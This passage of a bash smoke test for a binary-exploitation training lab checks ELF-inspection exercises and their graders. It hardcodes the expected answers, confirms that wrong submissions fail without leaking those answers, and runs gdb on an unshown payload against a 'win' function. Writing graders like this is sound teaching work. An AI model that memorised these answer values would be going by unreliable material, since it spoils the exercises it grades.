    > "$WORK/call-stack-cleanup-wrong.txt" 2>&1; then
    echo 'wrong call stack cleanup unexpectedly passed' >&2
    exit 1
fi
if grep -Eq '必须是[[:space:]]*4|正确.*4|答案.*4' "$WORK/call-stack-cleanup-wrong.txt"; then
    echo 'wrong call stack feedback leaked the cleanup answer' >&2
    exit 1
fi
if HOME="$WORK/home" bash "$CALL_STACK_LAB/check.sh" \
    "$RETURN_ADDRESS" "$ARGUMENT_VALUE" "$LOCAL_VALUE" 4 0x0000002a \
    > "$WORK/call-stack-return-wrong.txt" 2>&1; then
    echo 'wrong EAX return value unexpectedly passed' >&2
    exit 1
fi

ELF_BYTES_LAB="$ROOT/vm/labs/pwnhub/elf-bytes-01"
ELF_BYTES_ELF="$ELF_BYTES_LAB/elf-bytes"
chmod +x "$ELF_BYTES_ELF"
[ "$(sha256sum "$ELF_BYTES_ELF" | cut -d ' ' -f 1)" = \
    b95b37f88a4bd1f8bcbb126b353eec2f5cb7a8c2357ec24d449d4a5b4251a698 ]
ELF_MAGIC="$(od -An -tx1 -N4 "$ELF_BYTES_ELF" | tr -d ' \n')"
ELF_CLASS="$(od -An -tx1 -j4 -N1 "$ELF_BYTES_ELF" | tr -d ' \n')"
ELF_ENDIAN="$(od -An -tx1 -j5 -N1 "$ELF_BYTES_ELF" | tr -d ' \n')"
ELF_MARKER="$(strings "$ELF_BYTES_ELF" | sed -n 's/^PwnHub_ELF_marker:[[:space:]]*//p' | head -n 1)"
[ "$ELF_MAGIC" = 7f454c46 ]
[ "$ELF_CLASS" = 01 ]
[ "$ELF_ENDIAN" = 01 ]
[ "$ELF_MARKER" = ORBIT-386 ]
HOME="$WORK/home" bash "$ELF_BYTES_LAB/reset.sh"
HOME="$WORK/home" bash "$ELF_BYTES_LAB/inspect.sh" > "$WORK/elf-bytes-inspect.txt"
grep -Eq 'ELF 32-bit LSB executable, Intel (80386|i386)' "$WORK/elf-bytes-inspect.txt"
grep -Eq '^00000000  7f 45 4c 46 01 01 01 00  00 00 00 00 00 00 00 00' "$WORK/elf-bytes-inspect.txt"
grep -Eq '魔数[[:space:]]*\| 0x00 \| 7f 45 4c 46' "$WORK/elf-bytes-inspect.txt"
HOME="$WORK/home" bash "$ELF_BYTES_LAB/check.sh" \
    "$ELF_MAGIC" "$ELF_CLASS" "$ELF_ENDIAN" "$ELF_MARKER" \
    > "$WORK/elf-bytes-check.txt"
grep -qx 'elf-bytes replay passed' "$WORK/elf-bytes-check.txt"
if HOME="$WORK/home" bash "$ELF_BYTES_LAB/check.sh" \
    "$ELF_MAGIC" 02 "$ELF_ENDIAN" "$ELF_MARKER" \
    > "$WORK/elf-bytes-wrong.txt" 2>&1; then
    echo 'wrong ELF class unexpectedly passed' >&2
    exit 1
fi
if grep -Eq '必须是[[:space:]]*01|正确.*01|ORBIT-386' "$WORK/elf-bytes-wrong.txt"; then
    echo 'wrong ELF feedback leaked the expected observation' >&2
    exit 1
fi

ELF_SECTIONS_LAB="$ROOT/vm/labs/pwnhub/elf-sections-01"
ELF_SECTIONS_ELF="$ELF_SECTIONS_LAB/elf-sections"
chmod +x "$ELF_SECTIONS_ELF" "$ELF_SECTIONS_LAB"/*.sh
[ "$(sha256sum "$ELF_SECTIONS_ELF" | cut -d ' ' -f 1)" = \
    71b23b587a2a1e2a1ecf63f0fdc8cf68247965f6feb18e54fc1251fabf49883e ]
ELF_SECTIONS_HEADER="$(LC_ALL=C "$READELF_TOOL" -h "$ELF_SECTIONS_ELF")"
ELF_SECTIONS_TABLE="$(LC_ALL=C "$READELF_TOOL" -SW "$ELF_SECTIONS_ELF")"
ELF_ENTRY="$(printf '%s\n' "$ELF_SECTIONS_HEADER" | sed -n 's/^[[:space:]]*Entry point address:[[:space:]]*//p')"
ELF_TEXT_ADDRESS="$(printf '%s\n' "$ELF_SECTIONS_TABLE" | awk '$0 ~ /] \.text[[:space:]]/ { for (i = 1; i <= NF; i++) if ($i == ".text") { print $(i + 2); exit } }')"
ELF_BSS_TYPE="$(printf '%s\n' "$ELF_SECTIONS_TABLE" | awk '$0 ~ /] \.bss[[:space:]]/ { for (i = 1; i <= NF; i++) if ($i == ".bss") { print $(i + 1); exit } }')"
ELF_DATA_FLAGS="$(printf '%s\n' "$ELF_SECTIONS_TABLE" | awk '$0 ~ /] \.data[[:space:]]/ { for (i = 1; i <= NF; i++) if ($i == ".data") { print $(i + 6); exit } }')"
[ "$ELF_ENTRY" = 0x8049033 ]
[ "$ELF_TEXT_ADDRESS" = 08049000 ]
[ "$ELF_BSS_TYPE" = NOBITS ]
[ "$ELF_DATA_FLAGS" = WA ]
HOME="$WORK/home" PWNHUB_READELF="$READELF_TOOL" bash "$ELF_SECTIONS_LAB/reset.sh"
HOME="$WORK/home" PWNHUB_READELF="$READELF_TOOL" bash "$ELF_SECTIONS_LAB/inspect.sh" \
    > "$WORK/elf-sections-inspect.txt"
grep -Fq 'Entry point address:' "$WORK/elf-sections-inspect.txt"
grep -Eq '] \.bss[[:space:]]+NOBITS' "$WORK/elf-sections-inspect.txt"
HOME="$WORK/home" PWNHUB_READELF="$READELF_TOOL" bash "$ELF_SECTIONS_LAB/check.sh" \
    "$ELF_ENTRY" "$ELF_TEXT_ADDRESS" "$ELF_BSS_TYPE" "$ELF_DATA_FLAGS" \
    > "$WORK/elf-sections-check.txt"
grep -qx 'elf-sections replay passed' "$WORK/elf-sections-check.txt"
if HOME="$WORK/home" PWNHUB_READELF="$READELF_TOOL" bash "$ELF_SECTIONS_LAB/check.sh" \
    "$ELF_ENTRY" "$ELF_TEXT_ADDRESS" PROGBITS "$ELF_DATA_FLAGS" \
    > "$WORK/elf-sections-wrong.txt" 2>&1; then
    echo 'wrong ELF section type unexpectedly passed' >&2
    exit 1
fi
if grep -Eq '必须是[[:space:]]*NOBITS|正确.*NOBITS|答案.*NOBITS' "$WORK/elf-sections-wrong.txt"; then
    echo 'wrong ELF section feedback leaked the expected type' >&2
    exit 1
fi

ELF_SYMBOLS_LAB="$ROOT/vm/labs/pwnhub/elf-symbols-01"
ELF_SYMBOLS_ELF="$ELF_SYMBOLS_LAB/elf-symbols"
chmod +x "$ELF_SYMBOLS_ELF" "$ELF_SYMBOLS_LAB"/*.sh
[ "$(sha256sum "$ELF_SYMBOLS_ELF" | cut -d ' ' -f 1)" = \
    601d047adf4c98f03168236236e528ef19a445e688e0793aa774513810c0bf9f ]
ELF_SYMBOLS_OUTPUT="$(LC_ALL=C "$NM_TOOL" -n "$ELF_SYMBOLS_ELF")"
ELF_COMPUTE_ADDRESS="$(printf '%s\n' "$ELF_SYMBOLS_OUTPUT" | awk '$3 == "compute_total" { print $1; exit }')"
ELF_COMPUTE_TYPE="$(printf '%s\n' "$ELF_SYMBOLS_OUTPUT" | awk '$3 == "compute_total" { print $2; exit }')"
ELF_MIX_TYPE="$(printf '%s\n' "$ELF_SYMBOLS_OUTPUT" | awk '$3 == "mix_value" { print $2; exit }')"
ELF_PENDING_TYPE="$(printf '%s\n' "$ELF_SYMBOLS_OUTPUT" | awk '$3 == "pending_total" { print $2; exit }')"
[ "$ELF_COMPUTE_ADDRESS" = 08049031 ]
[ "$ELF_COMPUTE_TYPE" = T ]
[ "$ELF_MIX_TYPE" = t ]
[ "$ELF_PENDING_TYPE" = B ]
HOME="$WORK/home" PWNHUB_NM="$NM_TOOL" bash "$ELF_SYMBOLS_LAB/reset.sh"
HOME="$WORK/home" PWNHUB_NM="$NM_TOOL" bash "$ELF_SYMBOLS_LAB/inspect.sh" \
    > "$WORK/elf-symbols-inspect.txt"
grep -Eq '08049031[[:space:]]+T[[:space:]]+compute_total' "$WORK/elf-symbols-inspect.txt"
grep -Eq '08049020[[:space:]]+t[[:space:]]+mix_value' "$WORK/elf-symbols-inspect.txt"
HOME="$WORK/home" PWNHUB_NM="$NM_TOOL" bash "$ELF_SYMBOLS_LAB/check.sh" \
    "$ELF_COMPUTE_ADDRESS" "$ELF_COMPUTE_TYPE" "$ELF_MIX_TYPE" "$ELF_PENDING_TYPE" \
    > "$WORK/elf-symbols-check.txt"
grep -qx 'elf-symbols replay passed' "$WORK/elf-symbols-check.txt"
if HOME="$WORK/home" PWNHUB_NM="$NM_TOOL" bash "$ELF_SYMBOLS_LAB/check.sh" \
    "$ELF_COMPUTE_ADDRESS" t "$ELF_MIX_TYPE" "$ELF_PENDING_TYPE" \
    > "$WORK/elf-symbols-wrong.txt" 2>&1; then
    echo 'wrong ELF symbol visibility unexpectedly passed' >&2
    exit 1
fi
if grep -Eq 'compute_total.*T|mix_value.*t|pending_total.*B' "$WORK/elf-symbols-wrong.txt"; then
    echo 'wrong ELF symbol feedback leaked the expected types' >&2
    exit 1
fi

ELF_DISASSEMBLY_LAB="$ROOT/vm/labs/pwnhub/elf-disassembly-01"
ELF_DISASSEMBLY_ELF="$ELF_DISASSEMBLY_LAB/elf-disassembly"
chmod +x "$ELF_DISASSEMBLY_ELF" "$ELF_DISASSEMBLY_LAB"/*.sh
[ "$(sha256sum "$ELF_DISASSEMBLY_ELF" | cut -d ' ' -f 1)" = \
    63deb66624d45292e645b51804c6f9802fa2dd86a2a86cb6dcba75e390fe2cea ]
CHOOSE_OUTPUT="$(LC_ALL=C "$OBJDUMP_TOOL" -d -M intel --disassemble=choose_path "$ELF_DISASSEMBLY_ELF")"
COMPUTE_OUTPUT="$(LC_ALL=C "$OBJDUMP_TOOL" -d -M intel --disassemble=compute_result "$ELF_DISASSEMBLY_ELF")"
DISASSEMBLY_ADDRESS="$(printf '%s\n' "$CHOOSE_OUTPUT" | awk '$2 == "<choose_path>:" { print $1; exit }')"
DISASSEMBLY_CALL="$(printf '%s\n' "$COMPUTE_OUTPUT" | awk '{ for (i = 1; i <= NF; i++) if ($i == "call") { target = $NF; gsub(/[<>]/, "", target); print target; exit } }')"
DISASSEMBLY_JUMP="$(printf '%s\n' "$CHOOSE_OUTPUT" | awk '{ for (i = 1; i <= NF; i++) if ($i ~ /^j[a-z][a-z0-9]*$/) { print $i; exit } }')"
DISASSEMBLY_COMPARE="$(printf '%s\n' "$CHOOSE_OUTPUT" | awk '{ for (i = 1; i <= NF; i++) if ($i == "cmp") { value = $NF; sub(/^.*,/, "", value); sub(/^0x/, "", value); print value; exit } }')"
[ "$DISASSEMBLY_ADDRESS" = 08049020 ]
[ "$DISASSEMBLY_CALL" = choose_path ]
[ "$DISASSEMBLY_JUMP" = jne ]
[ "$DISASSEMBLY_COMPARE" = 7 ]
HOME="$WORK/home" PWNHUB_OBJDUMP="$OBJDUMP_TOOL" bash "$ELF_DISASSEMBLY_LAB/reset.sh"
HOME="$WORK/home" PWNHUB_OBJDUMP="$OBJDUMP_TOOL" bash "$ELF_DISASSEMBLY_LAB/inspect.sh" \
    > "$WORK/elf-disassembly-inspect.txt"
grep -Eq '08049020 <choose_path>:' "$WORK/elf-disassembly-inspect.txt"
grep -Eq 'call[[:space:]]+.*<choose_path>' "$WORK/elf-disassembly-inspect.txt"
HOME="$WORK/home" PWNHUB_OBJDUMP="$OBJDUMP_TOOL" bash "$ELF_DISASSEMBLY_LAB/check.sh" \
    "$DISASSEMBLY_ADDRESS" "$DISASSEMBLY_CALL" "$DISASSEMBLY_JUMP" "$DISASSEMBLY_COMPARE" \
    > "$WORK/elf-disassembly-check.txt"
grep -qx 'elf-disassembly replay passed' "$WORK/elf-disassembly-check.txt"
if HOME="$WORK/home" PWNHUB_OBJDUMP="$OBJDUMP_TOOL" bash "$ELF_DISASSEMBLY_LAB/check.sh" \
    "$DISASSEMBLY_ADDRESS" call "$DISASSEMBLY_JUMP" "$DISASSEMBLY_COMPARE" \
    > "$WORK/elf-disassembly-wrong.txt" 2>&1; then
    echo 'wrong ELF disassembly call target unexpectedly passed' >&2
    exit 1
fi
if grep -Eq 'choose_path|jne|0x7' "$WORK/elf-disassembly-wrong.txt"; then
    echo 'wrong ELF disassembly feedback leaked the expected facts' >&2
    exit 1
fi

if command -v gdb >/dev/null 2>&1; then
    gdb_output="$WORK/gdb.txt"
    if ! LC_ALL=C gdb -nx --batch -q "$ELF" \
        -ex 'set pagination off' \
        -ex 'break win' \
        -ex "run < $WORK/payload.bin" \
        -ex 'info registers eip' \
        -ex 'quit' > "$gdb_output" 2>&1; then
        cat "$gdb_output" >&2
        exit 1
    fi
    grep -q 'Breakpoint 1' "$gdb_output"
    grep -qi 'eip' "$gdb_output"
elif [ "${BINARY_PROFILE_REQUIRE_GDB:-0}" = 1 ]; then
    echo 'gdb is required for this smoke test' >&2
    exit 2
fi

echo '✓ binary profile smoke test passed'
